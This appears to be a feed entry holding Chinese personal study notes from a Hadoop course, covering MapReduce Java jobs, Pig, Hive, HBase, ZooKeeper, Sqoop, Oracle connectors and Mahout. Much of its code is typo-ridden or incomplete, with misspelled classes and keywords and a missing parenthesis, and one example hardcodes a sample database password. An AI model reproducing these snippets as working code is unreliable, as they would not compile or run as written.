-&gt; |聚合操作| -&gt; reduce -&gt; |求value的最大值/平均值等| -&gt; output -&gt; hdfs    Java MapReduce 通常需要3段程序    1.映射器 (从原始数据读成key，value)MaxTemperatureMapper    2.reducer（key,value变成最后需要的形式） MaxTemperatureReducer    3.作业程序,总调度 MaxTemperature运行MRcd myclass             //讲课创建的jar测试目录cat MaxTemperatureMapper.java     cat MaxTemperature.javacat MaxTemperatureReducer.javajavac -classpath ../hadoop-core-1.1.2.jar *.java../bin/hadoop MaxTemperature ./user/huang/in/723440-13964 ./out6  //数据文件. 输出到out6//没有找到Mapper，解决方式，打成jar包jar cvf ./MaxTemperature.jar *.classmv MaxTemperature.jar ..//需要删掉之前的class文件rm *.classcd ..bin/hadoop jar ./MaxTemperature.jar MaxTemperature ./user/huang/in/723440-13964 ./out6../bin/hadoop fs -ls ./out6../bin/hadoop fs -cat ./out6/part-r-00000//分析计算过程Mapperpublic void map(LongWritable key,Text value,Context context) throws IOException,InterruptedException{    String line = value.toString();    String year = line.substring(15,19);    int airTemperature;    if(line.charAt(87) == &apos;+&apos;){        //parseInt doesn&apos;t like leading plus signs        airTemperature = Integer.parseInt(line.substring(88,92));    }else{        airTemperature = Integer.parseInt(line.substring(87,92));    }    String quality = line.substring(92,93);    if(airTemperature != MISSING &amp;&amp; quality.matches(&quot;[01459]&quot;)){        context.write(new Text(year),new IntWritable(airTemperature));    }}Reducerpublic class MaxTemperatureReducer extends Reducer&lt;Text,IntWritable,Text,IntWritable&gt;{    @Override    public void reduce(Text key,Iterable&lt;IntWritable&gt; values,Context context) throws IOException,InterruptedException{        int maxValue = Integer.MIN_VALUE;        for(IntWritable value:values){            maxValue = Math.max(maxValue,value.get();        }        context.write(key,new IntWritable(maxValue));    }}M-R jobpublic class MaxTemperature{    main() throws Exception{        if(args.length != 2){            System.err.println(&quot;Usage:MaxTemperature&lt;input path&gt; &lt;output path&gt;&quot;);            System.exit(-1);        }        Job job = new Job();        job.setJarByClass(MaxTemperature.class);        job.setJobName(&quot;Max temperature&quot;);        FileInputFormat.addInputPath(job,new Path(args[0]));        FileOutputFormat.setOutputPath(job,new Path(args[1]));        job.setMapperClass(MaxTemperatureMapper.class);        job.setReducerClass(MaxTemperatureReducer.class);        job.setOutputKeyClass(Text.class);        job.setOutputValueClass(IntWritable.class);        System.exit(job.waitForCompletion(true)?0:1);    }}分片的问题Combiner     做预计算的。Map-Reduce工作机制    //java跟c相比，慢的是启动jvm这个过程。jvm启动不挂的话还是很快的    有一个心跳是3秒一次，jobtracker周期是1分钟一次主要工作：SQL或PL/SQL改写为Map-Reduce程序Eclipse:hadoop/contrib/eclipse-plugin/xxx.jarwindows-&gt;preferences-&gt;hadoop map/reduce    show Map-Reduce 显示MR视图在视图右键-&gt;new Hadoop loaction-&gt;Location name:xxxhadoop/conf/mapred-site.xml -&gt;找端口端口填写一致左侧右键DFS Loactions-&gt;Disconnect-&gt;home usernew -&gt; MapReduce Project -&gt; name:xxxsrc-&gt;new example.java@Overridepublic int run(String[] args)throws Exception{    Configuration conf = getConf();    Job job = new Job(conf,&quot;example&quot;);         //任务名    job.setJarByClass(example.class);        //指定Class    FileInputFormat.addInputPath(job,new Path(args[0]));     //输入路径    FileOutputFormat.setOutputPath(job,new Path(args[1]));     //输出路径    job.setMapperClass(Map.class);            //调用上面Map类作为Map任务代码    job.setReducerClass(Reduce.class);        //调用上面Reduce类作为Reduce任务代码    job.setOutputFormatClass(TextOutputFormat.class);    //指定输出的KEY的格式    job.setOutputKeyClass(Text.class);         //指定输出的KEY的格式    job.setOutputValueClass(Text.class);     //指定输出的VALUE的格式    job.waitForCompletion(true);    return job.isSuccessful()?0:1;}main(){    int res = ToolRunner.run(new Configuration(),new example(),args);    System.exit(res);}源文件:-&gt;Mapper1.分割原始数据2.输出所需数据3.处理异常数据-&gt;输出到HDFSpublic class Test_1 extends Configured implements Tool{    enum Counter{ //可以对其自增操作        LINESKIP,     //出错的行    }    public static class Map extends Mapper&lt;LongWritable,Text,NullWritable,Text&gt;{//变量为: 输入,输出key,value格式        //Text主要记录字符串的,NullWritable 空值        //key 偏移量 ，内容 value        public void map(LongWritable key,Text value,Context context) throws IOException,InterruptedException{            String line = value.toString();    //读取源数据            try{                //数据处理                String[] lineSplit = line.split(&quot; &quot;);                String month = lineSplit[0];                String time = lineSplit[1];                String mac = lineSplit[6];                Text out = new Text(month + &apos;&apos; + time + &apos;&apos; + mac);                //如果是context.write(key,out);则会出现\t                //用了NullWritable.get() 之后不会出现 \t                context.write(NullWritable.get(),out);//输出 key \t value            }catch(java.lang.ArrayIndexOutOfBoundsExecption e){                context.getCounter(Counter.LINESKIP).increment(1);//出错令计数器+1                return;            }        }    }    @Override    public int run(String[] args)throws Exception{        Configuration conf = getConf();        Job job = new Job(conf,&quot;example&quot;);         //任务名        job.setJarByClass(Test_1.class);        //指定Class        FileInputFormat.addInputPath(job,new Path(args[0]));     //输入路径        FileOutputFormat.setOutputPath(job,new Path(args[1]));     //输出路径        job.setMapperClass(Map.class);            //调用上面Map类作为Map任务代码        job.setReducerClass(Reduce.class);        //调用上面Reduce类作为Reduce任务代码        job.setOutputFormatClass(TextOutputFormat.class);    //指定输出的KEY的格式        job.setOutputKeyClass(Text.class);         //指定输出的KEY的格式        job.setOutputValueClass(Text.class);     //指定输出的VALUE的格式        job.waitForCompletion(true);        return job.isSuccessful()?0:1;    }    main(){        //运行任务        int res = ToolRunner.run(new Configuration(),new Test_1(),args);        System.exit(res);    }}Run_Configurations-&gt;Test_1-&gt;Arguments:hdfs://localhost:9000/user/james/input hdfs://localhost:9000/user/james/output//output必须是不存在的倒排索引new-&gt;Haodoop Project-&gt;Test_2public calss Test_2 extends Configured implements Tool{    enum Counter{        LINESKIP    }    public static class Map extends Mapper&lt;LongWritable,Text,Text,Text&gt;{//变量为: 输入,输出格式        String line = value.toString();             try{            //数据处理            String[] lineSplit = line.split(&quot; &quot;);//135,10085            String anum = lineSplit[0];            String bnum = lineSplit[1];            context.write(new Text(bnum),new Text(anum));        }catch(java.lang.ArrayIndexOutOfBoundsExecption e){            context.getCounter(Counter.LINESKIP).increment(1);//出错令计数器+1            return;        }    }    public static class Reduce extends Reducer&lt;Text,Text,Text,Text&gt;{        public void reduce(Text key,Iterable&lt;Text&gt; values,Context context)throws IOException,InterruptedException{            String valueString;            String out = &quot;&quot;;            for (Text value:values){                valueString = value.toString();                out += valueString + &quot;|&quot;;            }            context.write(key,new Text(out));        }    }    run(){        job.setReducerClass(Reduce.class);    }    main(){}}Export-&gt;JAR-&gt;JAR file path-&gt;next-&gt;Main Class填写-&gt;Clone//note05     MR实战性能调优：    究竟需要多个reducer？    输入：大文件(上G的）优于小文件    减少网络传输：压缩map的输出    优化每个节点能运行的任务数：mapred.tasktracker.map.tasks.maximum和mapred.tasktracker.reduce.tasks.maximum(缺省值均为2)hadoop流与脚本wordcount:    //数单词    cat install.log | wcweb Apache日志分析：    PV     IP    图片/日志点击先区分开         爬虫/日志点击区分开//排除爬虫探针设计         //在网站点击一下,只用算法排除的话，依然是多出3-5倍无用点击//不直接分析网站日志，而是间接分析探针日志，来计算pv&lt;script type=&quot;text/javascriopt&quot;&gt;    var _gaq = _gaq || [];     _gaq.push([&apos;_setAccount&apos;,&apos;UA-20237423-4&apos;]);    _gaq.push([&apos;_setDomainName&apos;,&apos;.itpub.net&apos;]);    _gaq.push([&apos;_trackPageview&apos;]);    (function(){        var ga = document.createElement(&apos;script&apos;);        ga.type = &apos;text/javascript&apos;;        ga.async = true;        ga.src = (&apos;https:&apos; == doucment.location.protocol? &apos;https://ssl&apos;:&apos;http://www&apos;) + &apos;.google-a???&apos;;        var s = document.getElementsByTagName(&apos;script&apos;)[0];        s.parentNode.insertBefore(ga,s);    })();&lt;/script&gt;&lt;div style=&quot;display:none&quot;&gt;&lt;script type=&quot;text/javascript&quot;&gt;    var _bdhmProtocol = ((&quot;https:&quot; == document.location.protocol) ? &quot;https://&quot; : &quot;http://&quot;);    document.write(unescape(&quot;%3Cscript src=&apos;&quot; + _bdhmProtocol + &quot;hm.baidu.com/h.js%3F5016281862f595e78&quot;));&lt;/script&gt;&lt;/div&gt;&lt;!-- END STAT PV --&gt;&lt;/body&gt;&lt;/html&gt;排除爬虫和程序点击，对抗作弊·用鼠标测动对抗爬虫·常用流量作弊手段·跟踪用户### 一边点击一边换IP ###拿搜索词？？纯真88统计浏览器类型少量数据的情况下：    awk,grep,sort,join等,perl,python,正则等海量数据的情况下： 10G,100G 增长的时候CDN    (反向代理加速)ip去重//note06  复杂应用/hadoop流InputFormat()OutputFormat()// 06 hadoop_v4_06c 04:00//note07 Pigset命令检查环境变量进入grunt shell    pig -x localPIG_CLASSPATH    pigPig的运行方法：    脚本    Grunt    嵌入式        pig转换为java，再由jvm执行Grunt    自动补全机制    Autocomplete文件    Eclipse插件PigPen    help    ls,cat,cd    copyToLocal test1.txt ttt  (复制到grunt外面的当前路径)    sh /usr/java/jdk1.7.0.0_26/bin/jps       //直接执行命令    Bag,Tuple,Field,Pig不要求具有各tuple相同数量或相同类型的fieldpig -x localA = LOAD &apos;/home/grid/csdn.txt&apos;USING PigStorage(&apos;#&apos;)B = FOREACH ASTORE B INTO &apos;/home/grid/emmail.txt&apos;USING PiagStorage();脚本：    grunt&gt; records = LOAD &apos;input/ncdc/micro-tab/sample.txt&apos;    &gt;&gt; AS (year:chararray,temperature:int,quality:int); //如果没有定义分隔符，则默认是制表符。    DUMP records;         //输出    DESCRIBE records;     //输出查看结构    filtered_records = FILTER records BY temperature != 9999 AND     &gt;&gt; (quality == 0 OR quality == 1 OR quality == 4 OR quality == 5 OR quality == 9);    DUMP filtered_records;    GROUP    FOREACH      //对每一行进行扫描处理//有点类似面向数据流的处理语言，Mapp-Reduce有点面向计算UDF 用户自定义函数    guoyunsky.iteye.com/blog/1317084reg:pigcat score.txtA = LOAD &apos;score.txt&apos; USING PigStorage(&apos;,&apos;) AS (student,course,teacher,score:int);DESCRIBE A;B = FOREACH A CENERATE student,teacher;DESCRIBE B;C = DISTINCT      //去重C = DISTINCT B;D = GROUP C BY student;D = FOREACH (GROUP C BY student) CENERATE group AS student,COUNT(C);DUMP D;//第二种方法DESCRIBE B;E = GROUP B BY student;DESCRIBE EF = FOREACH E{    T = B.teacher;    uniq = DISTINCT T;    GENERATE group AS student,COUNT(uniq) AS cnt;}//note08      Hive数据仓库工程师NoSQL -&gt; Not Only SQLHive安装配置文件cd hive/confhive-env.sh.template -&gt; hive-env.shHADOOP_HOME=xxxexport HIVE_CONF_DIR=xxxhive-site.xmlhadoop-env.shexport HADOOP_CLASSTHAN= xxx;./hiveshow tablescreate table abc (c1 string);drop table abc;/user/hive/warehouse/abc/数据insert overwrite table resultselect xxx frrom loc thrift server / JDBCreg:main()throws Exception{    CLass.forNmae(&quot;org.apache.hadoop.hive.jdbc.HiveDriber&quot;);    String dropSql=&quot;drop table pokes&quot;;    String createSql=&quot;create table pokes (foo int,bar string&quot;;    String insertSql=&quot;load data local inpath &apos;/home/zhangxin/hive/kv1.txt&apos; overwrite into table pokes&quot;;    String querySql=&quot;select bar from pokes limit 5&quot;;    Connection connection=DriverManager.getConnection(&quot;jdbc:hive://localhost:10000/default&quot;,&quot;&quot;,&quot;&quot;);    Statement statement = connection.createStatement();    statement.execute(dropSql);    statement.execute(createSql);    statement.execute(insertSql);    ResultSet rs = statement.executeQuery(querySql);    while(rs.next()){        sout(rs.getString(&quot;bar&quot;));    }}http://10.20.151.7:9999/hwi/         //ip改成自己的，默认web路径访问元数据//note09     Hivesql不同的，有3种独特的类型structmaparrayreg:create table employees(    name     STRING,    salary    FLOAT,    subordinates     ARRAY&lt;STRING&gt;,    deductions         MAP&lt;STRING,FLOAT&gt;,    address         STRUCT&lt;street:STRING,city:STRING,state:STRING,zip:INT&gt;    );缺省分隔符：\n^A     \001         分离不同的列(字段)^B     \002         分割数组/集合里面的元素^C     \003         map的key，value之间分割create table employees(    xxx)ROW format delimitedfields terminated by &apos;\001&apos;collection items terminated by &apos;\002&apos;map keys terminated by &apos;\003&apos;lines terminated by &apos;\n&apos;stored as textfile;DDL:create database if not exists financials;show databases like &apos;h.*&apos;;存放目录缺省存放目录由hive.metastore.warehouse.dir指定可以使用以下命令覆盖    create database financials    location &apos;/my/preferred/directory&apos;观看数据库描述create database financials    comment &apos;Holds all financial tables&apos;;describe database financials;create database financials    with dbproperties(&apos;creator&apos;=&apos;Mark Moneybags&apos;,&apos;date&apos;=&apos;2012-01-02&apos;);describe database extended financials;切换数据库USE financials;set hive.cli.print.current.db=true;hive (financials)&gt; USE default;hive (default)&gt; set hive.cli.print.current.db=false;hive&gt; ...删除和更改数据库drop database if exists financials;drop database if exists financials cascade;     //连数据一起删掉alter database financials set dbproperties(&apos;edited-by&apos;=&apos;Joe&apos;);创建表create table employees(    name     STRING comment &apos;Employee name&apos;,    salary    FLOAT comment &apos;Employee salary&apos;,    subordinates     ARRAY&lt;STRING&gt; comment &apos;Names of xx&apos;,    deductions         MAP&lt;STRING,FLOAT&gt;,    address         STRUCT&lt;street:STRING,city:STRING,state:STRING,zip:INT&gt;    )comment &apos;Description of the table&apos;tblproperties(&apos;creator&apos;=&apos;Mark Moneybags&apos;,&apos;date&apos;=&apos;2012-01-02&apos;)location &apos;/user/hive/warehouse/mydb.db/employees&apos;;create table if not exists mydb.employees2like mydb.employees;列出表USE mydb;show tables;use default;show tables in mydb;use mydb;show tables &apos;empl.*&apos;观看表的描述describe extended mydb.employees;外部表create table employees(    name     STRING comment &apos;Employee name&apos;,    salary    FLOAT comment &apos;Employee salary&apos;,    subordinates     ARRAY&lt;STRING&gt; comment &apos;Names of xx&apos;,    deductions         MAP&lt;STRING,FLOAT&gt;,    address         STRUCT&lt;street:STRING,city:STRING,state:STRING,zip:INT&gt;    )row format delimited fields terminated by &apos;,&apos;location &apos;/data/stocks&apos;;create external table if not exists mydb.employee3like mydb.employeeslocation &apos;/path/to/data&apos;;分区表：create table employees(    xxx)partitioned by (country STRING,state STRING);分区表的存储：会变成一个子目录里面的一系列文件set hive.mapred.mode=strict;select e.name,e.salalry from employees e limit 100;//报错，然后set hive.mapred.mode=nonstrict;select e.name,e.salalry from employees e limit 100;指定存储格式create table kstpartitioned by (ds string)row format serde &apos;com.linkedin.haivvreo.AvroSerDe&apos;with serdeproperties (&apos;schema.url&apos;=&apos;http://schema_provider/kst.avsc&apos;)stored asinputformat &apos;com.linkedin.haivvreo.AvroContainerInputFormat&apos;outputformat &apos;com.linkedin.haivvreo.AvroContainerOutputFormat&apos;;create external table if not exists stocks(    xxx)clustered by (exchange,symbol)sorted by (ymd asc)into 96 buckets删除和更改表alter table log_messages partition(year=2011,month=12,day=2)set location &apos;s3n://ourbucket/logs/2011/01/02&apos;;alert table log_messages set tblproperties(&apos;notes&apos;=&apos;The xxxx&apos;);列操作alter table log_messageschange column hms hours_minutes_secondes intcomment &apos;xx&apos;after severity;alter table log_messages add columns( app_name STRING);alter tbal log_messages replace columns(message STRING);DML操作    Hive不支持行级别，将数据放入表中的唯一办法是批量载入LOAD DATA LOCAL inpath &apos;{env:HOME}/california-employees&apos;overwrite into table employeespartition(country = &apos;US&apos;,state=&apos;CA&apos;);Insert overwrite语句insert overwrite table employeespartition(country=&apos;US&apos;)select * from staged_employees sewhere se.cnty=&apos;US&apos;from staged_employees se     //非分区表insert overwrite table employees     partition (country=&apos;US&apos;)    select * from xxx s    where s.cnty=&apos;US&apos;                 //将非分区的表变成了分区表动态分区插入set hive.exec.dynamic.partition=true;set hive.exec.dynamic.partition.mode=nonstrict;set hive.exec.max.dynamic.partitions.pernode=1000;创建表的同时把数据放进去create table ca_employeesas select name,salary,addressfrom employeeswhere se.state=&apos;CA&apos;;导出数据直接复制粘贴如果需要改动数据格式，可以使用insert overwriteinsert overwrite local directory &apos;/tmp/ca_employees&apos;select name,salary,addressfrom employeeswhere se.state = &apos;CA&apos;;SELECT:使用正则表达式select symobl,&apos;price.*&apos; from stocks;select name from employees where address.street like &apos;%Ave.&apos;select name,address.street from employees where address.street rlike &apos;.*(Chicage|Ontario).*&apos;;     //rlike 来正则匹配函数    //求各种统计指标的函数explode //可以把数组元素展开成很多行select explode(array(1,2,3)) as element from src;嵌套selectfrom (    select upper(name),deductions[&quot;Federal Taxes&quot;] as fed_taxes    from employees) eselect e.name,e.salary_minus_fed_taxeswhere e.salary_minus_fed_taxes &gt; 70000;连接操作(缓慢)set hive.auto.convert.join=true;select s.ymd,s.symbol,s.price_close,d.dividendfrom stocks s join dividends d on s.ymd = d.ymd and s.symbol = d.symbol where s.symbol=&apos;AAPL&apos;排序order by and sort bydistribute by cluster bybucket : 桶         hash     (抽样查询)select * from numbers TABLESAMPLE(BUCKET 3 OUT OF 10 ON rand())s;视图与索引create index employees_indexon tbale employees(country)as &apos;org.apache.hadoop.hive.ql.index.compact.CompactIndexHandler&apos;with deferred rebuildidxproperties(&apos;creator = &apos;me&apos;,&apos;created_at&apos;=&apos;some_time&apos;)in table employees_index_tablepartitioned by (country,name)comment &apos;Employees indexd by country and name.&apos;;位图索引建模执行计划Google Dremel山寨货：Apache Drill     Cloudera Impala （Hive的替代方案）yarm是底层架构在yarm上面就可以不用map-reduce了，可以用hadoop流什么的//note10 Hive-impala子项目 HBase Google Bigtable的开源实现 列式数据库 可集群化 可以使用shell、web、api等多种方 式访问 适合高读写(insert)的场景 HQL查询语言 NoSQL的典型代表产品//不是使用的SQL语言mysql是什么东西限制了其扩展，noSQL怎么解决的这个问题Sqoop    用于在Hadoop和关系型数据库之间交换数据    通过JDBC接口连入关系型数据库Avro    数据序列化工具Chukwa    架构在Hadoop之上的数据采集与分析框架    主要进行日志采集和分析Cassandra （几乎淘汰）    与Hbase类似，借鉴Google Bigtable的思想体系    特点：无中心的数据库         缺点：效率比较低Zookeeper：    //还是一个资源库    文件没有上下级之分    znode可以存放data，上限1M；还可以放ACL，访问控制列表。    一般是奇数个节点，节点都是平等的，表面看起来zookeeper是无中心的但是会选举一个出来。    zab协议    阶段1:领导者选举    阶段2:原子广播    每个节点放一个watch，leader修改了信息后其他节点可以查看到修改的信息，并更改自己的信息    分布锁：        znode---leader        -&gt;        lock     观察    羊群效应//note11     zookeeperBig Table想法：    (S#,sn,sd,sa)         /*        1.行列：key值            2.属性        3.value    */    hbase    删除不是正常删，而且给某个时间戳的一行插入一个新的行键打个标记作为删除 （HDFS不能进行文件修改，追加也很麻烦，Hbase做了一个折中的方式来insert。所有数据都是往内存里面插，在一定时间内存满了之后才可以写，即收集一定数据后就可以往里写，一写就是一块。）（Hbase每隔一段时间进行重整操作，会把一些比较小的时间拿出来合并成比较大的文件。抛弃是在重整操作过程中操作的，打标记的都扔掉，然后再重新写成一个大的文件。）    行键也是可以重复的    面向时间查询行键列族与列时间戳    可以由用户显式赋值    行键，列族：限定符，时间戳    来唯一决定    列族元素在物理上存放的是同一个地方，不同的列族是不同的物理存放    store        memoryStore (先)        storeFile (后)    当内存里面的东西足够多时会存到storeFile（物理）    读取是在memoryStore里面的    每过一段时间会触发合并过程，会把小的storeFile合并成大的storeFile，合并过程中会删除标记的行及过期的行    每一个storeFile对应一个HDFS的文件，会分散在不同的物理节点里面Region和Region服务器HLog-ROOT-和.META.表 HBase中有两张特殊的Table，-ROOT-和.META. Ø .META.:记录了用户表的Region信息，.META.可以有多个regoin Ø -ROOT-:记录了.META.表的Region信息，-ROOT-只有一个region  Ø Zookeeper中记录了-ROOT-表的locationMemstore与storeFile    一个store包含一个列族的所有数据，列族存放是在临近的区域里面传统数据库的行式存储为了读某个列的数据，必须要把整个行读完才能对其读取联机事务处理随机读写还是要用行式数据库。行式数据库存储问题行标识访问：B树索引B树索引原理：树形oracle行式存储的访问形式BigTable的LSM索引     （日志及数据）L：log        S：结构        M：merge（合并）日志就是数据zookeeper：安装：单机模式配置安装：集群模式hadoop与hbase版本问题    hbase-&gt;hadoop-core-x.x.x.jar //可以看hadoop匹配版本修改hbase-env.sh配置hbase-site.xml启动Hbase及验证bin/start-hbase.sh/usr/java/jdk1.6.0_26/bin/jpsHbase安装：伪分布模式编辑hbase-env.sh增加HBASE_CLASSPATH环境变量编辑hbase-site.xml打开分布模式覆盖hadoop核心jar包Hbase安装：完全分布模式192.168.5.134:60010/master.jsp//note12 Hbase操作命令复杂Hbase数据建模问题关系型数据库的弱点CAP定律：NoSQL运动NoSQL数据库家族    redis一半内存一半硬盘    列式数据库在数据分析时工作特别快满足一致性，可用性的系统Redis    key-value类型的数据库Hbase    不能group by等连接CassandraMongoDB    擅长处理非结构化数据Neo4J    适用于社交网站NoSQL与CAP    密切相关的。真的要做成分布式的话必须要在其中放弃一种，一般都选一致性Hbase存储架构理解    Key Length Value Length Key Value     //key,value的长度比较重要什么情况下使用Hbase？     成熟的数据分析主题，查询模式已经确立并且不轻易改变     传统的关系型数据库已经无法承受负荷，高速插入，大量读取      适合海量的，但同时也是简单的操作(例如key-value)关系型数据库的困难模式设计Hbase:表设计与查询实现搜索优化：    u-t    t-u辅助索引复合行键设计//note13 数据集成Sqoop    mysql hadoop 连接Flume    Chukwa    日志收集ODCH/OLH    oracle hadoop 连接Oracle大数据连接器Sqoop    SQL-to-HDFS工具    JDBChadoop-0.20.2下Squoop是不支持此版本的配置sqoop命令选项：    % sqoop help    % sqoop help import从mysql导入数据的例子% sqoop import --connect jdbc:mysql://localhost/hadoopguide \             //连入mysql&gt;--table widgets -m 1% hadoop fs -cat widgets/part-m-00000//间隔符用的，导入到Hbasesqoop import --connect jdbc:mysql//mysqlserver_IP/databaseName --table datatable --hbase-create-table --hbase-table hbase_tablename --column-family col_fam_name --hbase-row-key key_col_name其中，databaseName和datatable是mysql的数据库和表名，hbase_tablename是要导成hbase的表名，key_col_name可以指定datatable中哪一列作为hbase新表的rowkey,col_fam_name是除rowkey之外的所有列的列族名从oracle导入数据需要有ojdbc6.jar放在$SQOOP_HOME/lib里，不需要添加到classpathconnecturl=jdbc:oracle:thin:@172.7.10.16:1521:orcloraclename=scottoraclepassword=wang123456oracleTableName=test#需要从oracle中导入的表中的字段名columns=ID,STATE#导出到HDFS后的存放路径hdfsPath=/tmp/sqoop import --append --connect $CONNECTURL --username $ORACLENAME --password $ORACLEPASSWORD --m 1 --table $oracleTableName --columns $columns --hbase-create-table --hbase-table orl --hbase-row-key STATE --column-family orloracle big data connectors    HDFS直接连接器        可以把带有分隔符的文件作为oracle的外部表访问        还可以直接hadoop的文本文件作为数据源    hadoop装载器        直接把hadoop里面的东西装载过去Oracle HDFS直接连接器(ODCH)实验    Oracle Enterprise Linux配置hdfs_steam script文件...    (hadoop_v4_13d)/logs/extdir!cat lab4.2_setup_DB_dir.sqlset echo on    create or replace directory ODCH_LOG_DIR as &apos;/home/hadoop/.../logs&apos;    grant read,write on directory ODCH_LOG_DIR to SCOTT;@lab4.2_setup_DB_dir.sqlsqlplus scott/tiger!cat lab4.3_ext_tab.sqlSQL创建外部表preprocessor HDFS_BIN_PATH:hdfs_stream         //先预处理数据再读PROMPT&gt;sqlplus scott/tigerselect count(*) from odch_ext_table;set autotrace trace exp     //设置追踪，来观察执行计划select count(*) from odch_ext_para_table;CDN加速Flume    提供分布式，可靠和高可用的海量日志采集，聚合和传输的系统Chukwa//note14 扩展开发，与应用集成UDF     （用户定义函数） （reg：Pig，Hive）Thrift接口RhadoopUDF    写个自定义jar    create temporary function strip as &apos;com.hadoopbook.hive.[ClassName]&apos;    % hive --auxpath /path/to/hive-example.jar    select xxx(&apos;name&apos;) from student    filter:    jar    register pig-examples.jar    grunt&gt;filter.... com.hadoopbook.pig.xxxx(xxx);    DEFINE isGood com.hadoopbook.pig.xxxx();    然后就可以用 isGood(xxx);应用与Hbase的对接：通过Thrift    Thrift是一个跨语言的服务部署框架        通过一个中间语言（IDL，接口定义语言）来定义RPC的接口和数据类型//note15     与应用层连接并行计算框架    MPI    PVM    Mesos    Map-ReduceYARN    可以同时支持Map-Reduce，Storm，Spark，MPI等多种流行计算模型SparkYARN配置//note16 hadoop源代码//note17 hadoop与机器学习Hadoop与机器学习Mahout     （封装各种算法）（天生适合做离线数据分析）Hadoop在互联网企业中的应用spark基于内存来计算。成本比hadoop高不要求实时得出结果，可以不选sparkspark不太好转，跟java几乎无关Mahout     （在Data Mining上）数据金字塔：从下往上Making Decisions （决策层）Data Presentations （数据展示层）Data Mining     （数据挖掘，建立数学模型/算法，找到一种合适的算法）Data Exploration     （对数据进行简单的查询）Data Warehouses/Data Marts      ETL（数据仓库）Data Sources （数据源）回归    样本这里叫学习集    用来做预测分类器    决策树    贝叶斯分类器（顾客流失）（自己设置阈值）（文本分类）（搜索引擎判断两篇文章是否一致，概率多高）有学习集的进行特征提取就可以自动完成聚类（没有学习集）    （层次聚类法）数据挖掘数据分析    SAS，R，SPSS    SAS数据是经过检验的，R就不太可靠，SAS主要应用于金融传统数据分析工具的困境    处理数据受限于内存，因此无法处理海量数据（R处理上限可能是100万）（R跟SAS处理不能超过内存数，不然会机器异常）    ...    （聚类，推荐系统就无法使用抽样）    解决方向：hadoop集群和Map-Reduce并行计算常见算法的Map-Reduce化    样本独立性比较强的就可以map-reduceLucene 早期搜索引擎的项目Mahout的特点：下载和解压Mahoutwget http://mirrors.cnnic.cn/apache/mahout/0.6/mahout-distribution-0.6.tar.gztar xzf ./mahout-distribution-0.6.tar.gz配置环境变量export HADOOP_HOME=/home/huang/hadoop-1.1.2export HADOOP_CONF_DIR=/home/huang/hadoop-1.1.2/confexport MAHOUT_HOME=/home/huang/hadoop-1.1.2/mahout-distribution-0.6export MAHOUT_CONF_DIR=/home/huang/hadoop-1.1.2/mahout-distribution-0.6/conf export PATH=$PATH:$MAHOUT_HOME/conf:$MAHOUT_HOME/bin几个重要环境变量JAVA_HOME mahout运行需指定jdk的目录 MAHOUT_JAVA_HOME指定此变量可覆盖JAVA_HOME值HADOOP_HOME 如果配置，则在hadoop分布式平台上运行，否则单机运行 HADOOP_CONF_DIR指定hadoop的配置文件目录MAHOUT_LOCAL 如果此变量值不为空，则单机运行mahout。 MAHOUT_CONF_DIR mahout配置文件的路径，默认值是$MAHOUT_HOME/src/conf MAHOUT_HEAPSIZE mahout运行时可用的最大heap大小    （堆大小）验证安装成功bin/mahout源码和部分样本数据    装的时候要装源代码包(即-src的包)将测试数据copy到HDFShadoop/bin/hadoop fs -mkdir ./testdatahadooop/bin/hadoop fs -put ./synthetic_control.data ./testdatahadoop/bin/hadoop fs -ls ./testdata做一个kmeans测试（聚类测试）mahout org.apache.mahout.clustering.syntheticcontrol.kmeans.Job观察输出用mahout输出mahout vectordump --seqFile ./output/data/part-m-0000020Newsgroups数据集使用Mahout进行文本自动分类上传并解压数据20news-bydate-test 测试数据20news-dydate-train 训练数据建立训练集mahout org.apache.mahout.classifier.bayes.PrepareTwentyNewsgroups \ -p /home/huang/data/20news-bydate-train \-o /home/huang/data/bayes-test-input \     (结果输出到了本地。。)-a org.apache.mahout.vectorizer.DefaultAnalyzer \-c UTF-8（作了分词什么的。。）上传到HDFScd ../hadoop-1.1.2bin/hadoop fs -mkdir ./20newsbin/hadoop fs -put ../data/bayes-train-input ./20newsbin/hadoop fs -put ../data/bayes-test-input ./20news训练贝叶斯分类器mahout trainclassifier \-i /user/huang/20news/bayes-train-input \ -o /user/huang/20news/newsmodel \  （放输出的模型，即统计参数数据）-type cbayes-ng 2 \-source hdfs生成的模型bin/hadoop fs -ls ./20news/newsmodel     (里面放了一堆模型数据)测试贝叶斯分类器mahout testclassifier \-m /user/huang/20news/newsmodel \-d /user/huang/20news/bayes-test-input \ -type cbayes-ng 2 \-source hdfs \-method mapreduce京东部门结构 运维团队(负责管理维护集群的正常运行) 数据仓库团队(根据业务部门的要求进行数据统计和查询) 成都研究院(负责底层，包括源代码修改和按上层部门要求开发 Map-Reduce程序，比如一些UDF)淘宝对Hadoop源码的修改管理模式准实时的流数据处理技术 从Oracle, Mysql日志直接读取数据 部分数据源来自应用消息系统 以上数据经由Meta+Storm的流数据处理，写入HDFS，实现实时或准实时的数据分析  数据装载到Hive进行处理，结果写回Oracle和Mysql数据库Oceanbase百度 日志的存储和统计; 网页数据的分析和挖掘; 商业分析，如用户的行为和广告关注度等; 在线数据的反馈，及时得到在线广告的点击情况; 用户网页的聚类，分析用户的推荐度及用户之间的关联度。</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;pre&gt;&lt;code&gt;Hadoop--炼数成金
+
+//note01 Hadoop介绍与安装
+。。。
+
+
+倒排索引
+
+（1；1） 单词出现在标识号为1的网页的编辑量是第1的位置
+
+分词难度： 
+    字典；
+Page Rank
+    用于给每个网页价值评分
+Map-reduce思想：
+    计算PR 
+Lucene
+    hadoop的起源，提供了全文检索引擎的架构
+nutch
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
+    
+      <category term="大数据" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
+    
+      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E5%A4%A7%E6%95%B0%E6%8D%AE/%E5%9F%BA%E7%A1%80/"/>
+    
